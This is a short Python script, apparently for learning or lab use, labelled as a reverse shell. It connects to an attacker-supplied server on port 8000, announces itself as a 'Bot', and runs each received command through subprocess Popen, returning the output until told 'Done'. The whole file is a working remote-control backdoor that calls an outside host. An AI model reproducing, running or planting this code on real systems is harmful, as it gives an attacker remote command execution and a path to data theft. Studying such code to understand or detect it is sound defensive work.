#reverse shell

#Import relevant libraries 
import sys 
from subprocess import Popen, PIPE 
from socket import * 
# Get server name from the second argument of the command, port is set to 8000 
serverName = sys.argv[1]
serverPort = 8000 
# Create IPv4(AF_INET), TCPSocket(Sock_Stream) 
clientSocket = socket(AF_INET, SOCK_STREAM) 
clientSocket.connect((serverName, serverPort)) 
clientSocket.send('Bot ready and waiting!'.encode()) 
# Decode the binary data received and convert into a string 
command = clientSocket.recv(4064).decode()
# While the command is not "Done" process and execute it and send back results. 
while command != "Done": 
    proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)   
    result, err = proc.communicate()   
    clientSocket.send(result) 
    command = (clientSocket.recv(4064)).decode() 
clientSocket.close() 
